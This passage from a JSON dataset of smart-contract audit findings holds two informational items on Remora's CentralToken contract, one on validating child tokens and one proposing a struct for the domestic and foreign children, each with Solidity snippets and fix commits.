for domestic, 1 for foreign\n        bool isDomestic = IChildRWAToken(tokenAddress).domestic();\n        uint256 childIndex = isDomestic ? 0 : 1;\n\n\n        if (childTokens[childIndex] != address(0)) revert ChildTokenAlreadyExists();\n        childTokens[uint256(childIndex)] = tokenAddress;\n\n        emit ChildTokenAdded(tokenAddress, isDomestic);\n    }\n```\n\n**Remora:** Fixed at commit [846851a](https://github.com/remora-projects/remora-dynamic-tokens/commit/846851ae7f691ed77d235185584ac0fb82b43e77).\n\n**Cyfrin:** Verified.\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1922,
      "end_line": 1971,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Extra validation on `CentralToken::addChildToken` will prevent adding incorrect `ChildToken`"
    },
    {
      "index": 23,
      "page_start": null,
      "heading": "Consider using struct instead of an array for the domestic and foreign child tokens",
      "markdown": "### Consider using struct instead of an array for the domestic and foreign child tokens\n\n**Description:** The `CentralToken` code could probably be simplified by using the following data structure for child tokens.\n\n\n```solidity\n    struct Children {\n        address domestic;\n        address foreign;\n    }\n\n    Children private children;\n```\n\nThis should lead to greater code clarity. Currently one has to remember that 0 = domestic and 1 = foreign.\n\nThis helper function could then be used wherever you currently iterate over the children to retain convenience.\n\n```solidity\n    function _forEachChild(function(address) internal fn) internal {\n        address a = children.domestic; if (a != address(0)) fn(a);\n        a = children.foreign;  if (a != address(0)) fn(a);\n    }\n```\n\n\n**Remora:** Fixed at commit [f753fac](https://github.com/remora-projects/remora-dynamic-tokens/commit/f753faca15ce9bfdcda3ed690c65aba410a22f37).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n",
      "finding_id": null,
      "severity": "Informational",
      "start_line": 1971,
      "end_line": 2002,
      "description": null,
      "metadata": {
        "Severity": "Informational",
        "Difficulty": null,
        "Type": null,
        "Finding ID": null,
        "Target": null
      },
      "heading_cleaned": "Consider using struct instead of an array for the domestic and foreign child tokens"
    }
  ]
}